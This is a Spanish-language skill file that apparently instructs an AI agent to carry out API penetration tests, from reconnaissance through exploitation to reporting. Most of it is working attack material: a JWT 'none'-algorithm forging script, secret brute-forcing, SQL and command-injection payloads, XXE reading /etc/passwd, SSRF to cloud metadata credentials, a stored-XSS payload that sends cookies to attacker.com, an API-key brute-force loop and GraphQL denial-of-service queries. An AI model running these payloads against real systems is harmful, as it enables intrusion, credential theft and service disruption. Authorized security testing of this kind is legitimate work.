---
name: api-pentest
description: >
  Usar esta habilidad SIEMPRE que el usuario quiera realizar pruebas de penetración, auditoría,
  análisis o explotación de vulnerabilidades sobre una API REST, API GraphQL, API SOAP, portal
  web con API, servicio HTTP/HTTPS con endpoints de API, IP o FQDN con servicios de API activos.
  Activar cuando se mencionen: auditoría de API, OWASP API Top 10, autenticación API, JWT,
  OAuth2, API Key, token de acceso, endpoints API, Swagger, OpenAPI, GraphQL, REST, SOAP,
  inyección en API, BOLA, BFLA, SSRF en API, inyección de objetos, fuerza bruta API,
  limitación de tasa, CORS, cabeceras de seguridad API, fuzzing de API, enumeración de endpoints,
  secretos en GitHub, XSS en API, o cualquier técnica ofensiva sobre interfaces de programación.
  También activar cuando el usuario proporcione una IP/FQDN y pida: reconocimiento de API,
  explotar API, prueba de concepto API, análisis de token, auditar OAuth, revisar JWT,
  buscar endpoints expuestos, o auditoría de seguridad de API.
  Repositorio de referencia: https://github.com/hackingyseguridad/apiaudit/
---

# Habilidad de Pentesting de API — hackingyseguridad/apiaudit

Habilidad de auditoría ofensiva sobre interfaces de programación de aplicaciones (API).
Cubre el ciclo completo: reconocimiento de servidor → descubrimiento de endpoints →
análisis de autenticación y autorización → inyecciones → explotación de vulnerabilidades
OWASP API Top 10 → análisis de TLS → generación de evidencias.

> ⚠️ Uso exclusivo en entornos con autorización expresa por escrito. Hacking ético.

---

## ARQUITECTURA TÍPICA DE UNA API (referencia)

```
Clientes (móvil/web/terceros)
        │
        ▼
  Pasarela de API (API Gateway)
  ├── Autenticación / Autorización (OAuth2, JWT, API Key)
  ├── Limitación de peticiones (Rate Limiting)
  ├── Enrutamiento de endpoints
  └── Registro y monitorización
        │
        ▼
  Servidor Backend API
  ├── /api/v1/usuarios
  ├── /api/v1/productos
  └── /api/v1/pagos
```

---

## INSTALACIÓN RÁPIDA (Kali Linux)

```bash
git clone https://github.com/hackingyseguridad/apiaudit.git
cd apiaudit
bash instalar.sh

# Dependencias requeridas
apt install -y curl jq nmap nikto whatweb wafw00f sslyze wapiti \
  dirb gobuster feroxbuster wget whois dnsrecon theharvester
pip3 install jwt requests --break-system-packages
```

---

## FASE 1 — Reconocimiento automático del servidor

### 1.1 Auditoría automática del servidor (punto de entrada)

```bash
# Auditoría completa del servidor HTTPS/API — ejecutar primero siempre
bash fqdnaudit.sh <FQDN_o_IP>
bash fqdnaudit2.sh <FQDN_o_IP>

# Qué analiza fqdnaudit.sh de forma automática:
# ✔ Puertos y servicios abiertos con sus CVEs asociados
# ✔ Servidor web/HTTPS utilizado y versión
# ✔ Protocolo TLS, cifrados débiles y renegociación a versiones anteriores
# ✔ Certificado digital y entidad certificadora (CA)
# ✔ Cabeceras HTTP de seguridad presentes y ausentes
# ✔ Métodos HTTP permitidos (GET, POST, PUT, DELETE, TRACE, CONNECT...)
# ✔ Mecanismos antiabuso (limitación de peticiones, protección DDoS)
# ✔ Seguridad de las cookies y otros vectores
```

### 1.2 Identificación de tecnologías

```bash
# Identificar servidor, lenguaje, framework y versión
whatweb https://<FQDN_o_IP>
whatweb -a 3 https://<FQDN_o_IP>   # modo agresivo

# Cabeceras de respuesta del servidor
curl -I https://<FQDN_o_IP>/api/
curl -sk https://<FQDN_o_IP>/api/ | python3 -m json.tool

# Detección de pasarela de API (WAF/Gateway)
wafw00f https://<FQDN_o_IP>
nmap -p 80,443,8080,8443 --script http-waf-detect <IP>
```

### 1.3 Análisis de TLS/SSL y cifrados

```bash
# Análisis completo de TLS
bash qtls.sh <FQDN_o_IP>
bash qtls2.sh <FQDN_o_IP>
sslyze --regular <FQDN_o_IP>
nmap -p 443 --script ssl-enum-ciphers,ssl-cert,ssl-dh-params <IP>

# Referencia de cifrados vulnerables: cifrados.xls (en el repositorio)
# Cifrados a detectar: SSLv2, SSLv3, TLS 1.0, RC4, DES, 3DES,
# EXPORT, NULL, aNULL, claves DH < 2048 bits
```

---

## FASE 2 — Descubrimiento de endpoints y documentación

### 2.1 Rutas de documentación habituales (revisar siempre primero)

```bash
# Documentación Swagger / OpenAPI
curl -sk https://<FQDN>/swagger/index.html
curl -sk https://<FQDN>/openapi.json    | python3 -m json.tool
curl -sk https://<FQDN>/api/swagger/v1 | python3 -m json.tool
curl -sk https://<FQDN>/api/swagger
curl -sk https://<FQDN>/api/docs
curl -sk https://<FQDN>/api/v1
curl -sk https://<FQDN>/api/v2
curl -sk https://<FQDN>/api/v3

# GraphQL — punto de introspección
curl -X POST https://<FQDN>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

### 2.2 Enumeración de endpoints con diccionario

```bash
# Con diccionario específico de API incluido en el repositorio
gobuster dir -u https://<FQDN> \
  -w diccionario.txt \
  -t 30 -k \
  -H "Accept: application/json"

# Diccionarios adicionales especializados en API
gobuster dir -u https://<FQDN>/api \
  -w /usr/share/wordlists/dirb/common.txt \
  -x json,xml,yaml -k -t 40

# Feroxbuster con detección de API
feroxbuster -u https://<FQDN>/api \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -k --filter-status 404,400

# Con nmap NSE
nmap -p 80,443,8080,8443 --script http-enum <IP>
```

### 2.3 Prueba de métodos HTTP permitidos por endpoint

```bash
# Comprobar qué métodos acepta cada endpoint
for METHOD in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo -n "$METHOD: "
  curl -sk -X $METHOD https://<FQDN>/api/v1/usuarios \
    -o /dev/null -w "%{http_code}\n"
done

# Métodos peligrosos a detectar: PUT, DELETE, TRACE, CONNECT
# Un 200/201 en PUT o DELETE sin autenticación es crítico
```

---

## FASE 3 — Autenticación y autorización

### 3.1 Análisis de JWT (JSON Web Token)

```bash
# Decodificar un JWT sin verificar firma (análisis de cabecera y carga útil)
echo "<TOKEN_JWT>" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo "<TOKEN_JWT>" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Ataques sobre JWT
# 1. Algoritmo 'none' (omisión de firma)
python3 -c "
import base64, json
cabecera = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
carga = base64.b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{cabecera}.{carga}.')
"

# 2. Confusión de algoritmo RS256 → HS256
# Si el servidor usa RS256 y la clave pública es conocida,
# firmar con HS256 usando la clave pública como secreto compartido

# 3. Fuerza bruta del secreto compartido (HS256)
# Herramienta: hashcat
hashcat -a 0 -m 16500 <token_jwt> /usr/share/wordlists/rockyou.txt
# Herramienta: jwt_tool
python3 jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```

### 3.2 Pruebas de autorización deficiente

```bash
# BOLA — Referencia directa a objetos defectuosa (OWASP API #1)
# Acceder a recursos de otro usuario cambiando el identificador
curl -sk https://<FQDN>/api/v1/usuarios/1 \
  -H "Authorization: Bearer <TOKEN_USUARIO_2>"
curl -sk https://<FQDN>/api/v1/pedidos/1000 \
  -H "Authorization: Bearer <TOKEN_USUARIO_2>"

# BFLA — Autorización a nivel de función defectuosa (OWASP API #5)
# Acceder a endpoints de administración con token de usuario normal
curl -sk https://<FQDN>/api/v1/admin/usuarios \
  -H "Authorization: Bearer <TOKEN_USUARIO_NORMAL>"
curl -X DELETE https://<FQDN>/api/v1/usuarios/999 \
  -H "Authorization: Bearer <TOKEN_USUARIO_NORMAL>"

# Acceso sin autenticación a endpoints que deberían requerirla
curl -sk https://<FQDN>/api/v1/usuarios
curl -sk https://<FQDN>/api/v1/admin
curl -sk https://<FQDN>/api/v1/configuracion
```

### 3.3 Análisis de OAuth 2.0

```bash
# Descubrimiento de endpoints OAuth
curl -sk https://<FQDN>/.well-known/oauth-authorization-server | python3 -m json.tool
curl -sk https://<FQDN>/.well-known/openid-configuration | python3 -m json.tool

# Prueba de flujo implícito inseguro
curl -sk "https://<FQDN>/oauth/authorize?\
response_type=token&client_id=<CLIENT_ID>&redirect_uri=https://attacker.com"

# Verificar si el servidor de autorización valida redirect_uri correctamente
curl -sk "https://<FQDN>/oauth/authorize?\
response_type=code&client_id=<CLIENT_ID>&redirect_uri=https://attacker.com/callback"
```

### 3.4 Clave API (API Key) — pruebas de validación

```bash
# Clave API ausente — ¿responde igualmente?
curl -sk https://<FQDN>/api/v1/datos | python3 -m json.tool

# Clave API en distintos campos
curl -sk https://<FQDN>/api/v1/datos -H "X-API-Key: CLAVE_INVALIDA"
curl -sk "https://<FQDN>/api/v1/datos?api_key=CLAVE_INVALIDA"
curl -sk https://<FQDN>/api/v1/datos -H "Authorization: ApiKey CLAVE_INVALIDA"

# Fuerza bruta sobre clave API con diccionario
while read CLAVE; do
  CODIGO=$(curl -sk -o /dev/null -w "%{http_code}" \
    https://<FQDN>/api/v1/datos -H "X-API-Key: $CLAVE")
  [ "$CODIGO" = "200" ] && echo "¡Clave válida!: $CLAVE"
done < diccionario.txt
```

---

## FASE 4 — Inyecciones en parámetros de API

### 4.1 Inyección SQL en parámetros de API

```bash
# Detección básica en endpoints GET
curl -sk "https://<FQDN>/api/v1/usuarios?id=1'"
curl -sk "https://<FQDN>/api/v1/usuarios?id=1 OR 1=1--"
curl -sk "https://<FQDN>/api/v1/usuarios?nombre=admin' AND SLEEP(5)--"

# Detección en cuerpo JSON (POST)
curl -X POST https://<FQDN>/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"usuario":"admin'\''","contrasena":"x"}'

curl -X POST https://<FQDN>/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"usuario":"admin\" OR \"1\"=\"1","contrasena":"x"}'

# Con sqlmap sobre endpoint de API
sqlmap -u "https://<FQDN>/api/v1/usuarios?id=1" \
  --batch --dbs --level=3 --risk=2 \
  -H "Authorization: Bearer <TOKEN>"

sqlmap -u "https://<FQDN>/api/v1/buscar" \
  --data='{"termino":"test"}' \
  --content-type="application/json" \
  --batch --dbs
```

### 4.2 Inyección de comandos en API

```bash
# Parámetros susceptibles: host, ping, exec, cmd, comando, fichero
curl -X POST https://<FQDN>/api/v1/herramientas/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1; id"}'

curl -X POST https://<FQDN>/api/v1/herramientas/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"127.0.0.1 | whoami"}'

curl -X POST https://<FQDN>/api/v1/herramientas/ping \
  -H "Content-Type: application/json" \
  -d '{"host":"$(id)"}'
```

### 4.3 Entidades externas XML — XXE

```bash
# Si la API acepta XML
curl -X POST https://<FQDN>/api/v1/importar \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE raiz [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<raiz><datos>&xxe;</datos></raiz>'

# XXE con SSRF para acceso interno
curl -X POST https://<FQDN>/api/v1/importar \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE raiz [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<raiz><datos>&xxe;</datos></raiz>'
```

### 4.4 Falsificación de peticiones del lado del servidor — SSRF

```bash
# Parámetros susceptibles: url, destino, redirigir, webhook, callback, imagen
curl -X POST https://<FQDN>/api/v1/obtener-recurso \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1/admin"}'

curl -X POST https://<FQDN>/api/v1/obtener-recurso \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Servicios internos habituales a probar vía SSRF
for PUERTO in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
  echo -n "Puerto $PUERTO: "
  curl -sk -X POST https://<FQDN>/api/v1/obtener-recurso \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.0.0.1:$PUERTO\"}" \
    -o /dev/null -w "%{http_code}\n"
done
```

### 4.5 Inyección en GraphQL

```bash
# Introspección — obtener esquema completo
curl -X POST https://<FQDN>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { fields { name description } } } }"}'

# Inyección SQL en consulta GraphQL
curl -X POST https://<FQDN>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usuario(id: \"1 OR 1=1\") { nombre correo } }"}'

# Denegación de servicio por consulta profunda (DoS GraphQL)
curl -X POST https://<FQDN>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ a { a { a { a { a { a { a { a { a { a { nombre } } } } } } } } } } }"}'

# Enumeración de usuarios mediante GraphQL
curl -X POST https://<FQDN>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usuarios { id nombre correo rol } }"}'
```

### 4.6 Secuencias de comandos en sitios cruzados — XSS en API

```bash
# Prueba de XSS almacenado vía API (parámetros que se muestran en interfaz web)
bash xsstest.sh <FQDN>

# Cargas útiles del repositorio
cat xss-payloads.txt

# XSS en cuerpo JSON
curl -X POST https://<FQDN>/api/v1/comentarios \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"texto":"<script>document.location='\''https://attacker.com/robo?c='\''+document.cookie</script>"}'

# XSS almacenado en campo nombre de usuario
curl -X PUT https://<FQDN>/api/v1/perfil \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"nombre":"<img src=x onerror=alert(document.domain)>"}'
```

---

## FASE 5 — Prueba de concepto sobre `apitest.sh`

```bash
# Ejecución del script de pruebas de API del repositorio
# Requiere: FQDN/IP, sintaxis de la API y credenciales/token de acceso
bash apitest.sh

# El script comprueba de forma guiada:
# ✔ Listas de control de acceso (ACL) y restricciones por origen
# ✔ Métodos de autenticación y cómo viajan las credenciales
# ✔ Manejo de errores (error handling) — información sensible expuesta
# ✔ Validación de entradas (input validation) por perfil
# ✔ Control de acceso granular por endpoint
# ✔ Limitación de peticiones (rate limiting) y protección antiabuso
# ✔ Configuración CORS y solicitudes de origen cruzado
# ✔ Versionado de la API (v1, v2, v3) y compatibilidad
# ✔ Expiración y renovación de tokens de acceso
# ✔ Gestión segura de sesiones e invalidación
# ✔ Tokens CSRF en operaciones con efecto lateral
```

---

## FASE 6 — Limitación de peticiones y denegación de servicio

```bash
# Comprobar si existe limitación de peticiones (rate limiting)
for i in $(seq 1 50); do
  curl -sk -o /dev/null -w "%{http_code} " \
    https://<FQDN>/api/v1/login \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"usuario":"admin","contrasena":"test"}'
done
echo ""
# Si todos devuelven 200: NO hay limitación de peticiones → CRÍTICO

# Fuerza bruta de inicio de sesión sin bloqueo
curl -X POST https://<FQDN>/api/v1/login \
  -H "Content-Type: application/json" \
  --parallel --parallel-max 10 \
  -d @- << 'EOF'
{"usuario":"admin","contrasena":"PASS_AQUI"}
EOF

# Prueba de inundación ligera (solo en entorno de pruebas autorizado)
ab -n 1000 -c 50 https://<FQDN>/api/v1/estado
```

---

## FASE 7 — Configuración CORS

```bash
# Comprobar política CORS — origen arbitrario
curl -sk https://<FQDN>/api/v1/datos \
  -H "Origin: https://attacker.com" \
  -H "Authorization: Bearer <TOKEN>" \
  -I | grep -i "access-control"

# CORS vulnerable si responde:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true

# Prueba con origen nulo
curl -sk https://<FQDN>/api/v1/datos \
  -H "Origin: null" \
  -H "Authorization: Bearer <TOKEN>" \
  -I | grep -i "access-control"

# Prueba de preflight OPTIONS
curl -X OPTIONS https://<FQDN>/api/v1/datos \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  -I
```

---

## FASE 8 — Secretos expuestos en GitHub

```bash
# Búsqueda de secretos de API expuestos en repositorios públicos
bash github.sh <nombre_organizacion_o_dominio>
bash github0.sh <nombre_organizacion_o_dominio>

# Búsqueda manual en GitHub (dorks)
# En github.com/search:
# org:<empresa> "api_key"
# org:<empresa> "Bearer "
# org:<empresa> "client_secret"
# org:<empresa> "password" extension:env
# org:<empresa> "token" filename:.env
# org:<empresa> "Authorization:" language:python
```

---

## FASE 9 — Cabeceras de seguridad HTTP en API

```bash
# Verificar presencia de cabeceras de seguridad obligatorias
curl -sk -I https://<FQDN>/api/v1/ | grep -iE \
  "strict-transport|content-security|x-frame|x-content-type|\
referrer-policy|permissions-policy|access-control|x-xss"

# Referencia de cabeceras requeridas (x-cabeceras.txt del repositorio)
cat x-cabeceras.txt
```

**Cabeceras obligatorias en una API segura:**

| Cabecera | Valor recomendado | Riesgo si ausente |
|----------|------------------|-------------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Interceptación en tránsito |
| `Content-Security-Policy` | `default-src 'none'` | XSS almacenado |
| `X-Content-Type-Options` | `nosniff` | Confusión de tipo MIME |
| `X-Frame-Options` | `DENY` | Secuestro de clics |
| `Access-Control-Allow-Origin` | Origen específico, nunca `*` con credenciales | Robo de datos CORS |
| `Cache-Control` | `no-store` | Datos sensibles en caché |
| `Content-Type` | `application/json; charset=utf-8` | Inyección de tipo de contenido |

---

## OWASP API SECURITY TOP 10 — Tabla de referencia rápida

| # | Categoría | Descripción | Prueba principal |
|---|-----------|-------------|-----------------|
| API1 | BOLA | Referencia directa a objetos defectuosa | Cambiar ID de objeto en endpoint |
| API2 | Autenticación defectuosa | JWT sin firma, credenciales débiles | Algoritmo `none`, fuerza bruta |
| API3 | Autorización a nivel de propiedad defectuosa | Campos ocultos accesibles o modificables | Enviar campos no documentados |
| API4 | Consumo sin restricciones de recursos | Sin limitación de peticiones ni tamaño | Peticiones masivas, cargas grandes |
| API5 | BFLA | Autorización a nivel de función defectuosa | Acceder a endpoints de administración |
| API6 | Asignación masiva | Campos extra aceptados sin filtrar | Incluir campos `rol`, `admin` en JSON |
| API7 | Configuración incorrecta de seguridad | CORS abierto, cifrados débiles, errores verbosos | Origen arbitrario, métodos OPTIONS |
| API8 | Falta de protección frente a amenazas automatizadas | Sin captcha, sin bloqueo por intentos | Fuerza bruta, enumeración masiva |
| API9 | Gestión incorrecta de inventario | Versiones antiguas expuestas | Acceder a /api/v1 estando en v3 |
| API10 | Consumo inseguro de API de terceros | Datos externos sin validar | SSRF, inyección vía webhook |

---

## FASE 10 — Asignación masiva (Mass Assignment)

```bash
# Intentar asignar campos privilegiados no documentados en el registro
curl -X POST https://<FQDN>/api/v1/usuarios \
  -H "Content-Type: application/json" \
  -d '{"nombre":"atacante","correo":"atacante@test.com",
       "contrasena":"Temporal1!","rol":"admin","activo":true,
       "credito":99999,"verificado":true}'

# Intentar escalar privilegios editando el perfil propio
curl -X PUT https://<FQDN>/api/v1/perfil \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN_USUARIO_NORMAL>" \
  -d '{"nombre":"yo","rol":"admin","permisos":["leer","escribir","borrar","administrar"]}'

# Campos ocultos habituales a probar: rol, admin, activo, verificado,
# credito, saldo, permisos, nivel, grupo, isAdmin, superuser
```

---

## PLANTILLA DE HALLAZGO DE API PARA INFORME

```
HALLAZGO:  [Nombre del hallazgo / Categoría OWASP API]
Servicio:  API REST / GraphQL / SOAP — [tecnología y versión]
IP/FQDN:   [objetivo]
Endpoint:  [método] https://[FQDN]/api/v1/[recurso]
CVSS v3.1: [puntuación] ([Crítico/Alto/Medio/Bajo])
Vector:    [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]
CWE:       [CWE-nnn — Descripción]
OWASP API: [API1:2023 / API2:2023 / ...]

DESCRIPCIÓN:
[Descripción técnica de la vulnerabilidad detectada en la API]

PRUEBA DE CONCEPTO / EVIDENCIA:
$ curl -X [MÉTODO] https://[FQDN]/api/v1/[endpoint] \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [TOKEN]" \
  -d '[CARGA_ÚTIL]'

Respuesta del servidor:
HTTP/1.1 [código]
[cabeceras relevantes]
[cuerpo de la respuesta — recortado]

IMPACTO:
[Fuga de datos / Escalada de privilegios / Ejecución remota /
 Omisión de autenticación / Denegación de servicio / Toma de control de cuenta]

REMEDIACIÓN:
- [Medida técnica específica para este hallazgo]
- Implementar validación de autorización en cada endpoint
- Aplicar principio de mínimo privilegio en todos los perfiles
- [Referencia a documentación oficial de la solución]

REFERENCIAS:
- https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- https://nvd.nist.gov/vuln/detail/[CVE si aplica]
- https://github.com/hackingyseguridad/apiaudit/
```

---

## REFERENCIAS

- Repositorio: https://github.com/hackingyseguridad/apiaudit/
- OWASP API Security Top 10 (2023): https://owasp.org/API-Security/
- PortSwigger API Testing: https://portswigger.net/web-security/api-testing/top-10-api-vulnerabilities
- Cabeceras de seguridad HTTP: `x-cabeceras.txt` (en el repositorio)
- Cifrados TLS vulnerables: `cifrados.xls` (en el repositorio)
- Cargas útiles XSS: `xss-payloads.txt` (en el repositorio)
- Diccionario de endpoints: `diccionario.txt` (en el repositorio)
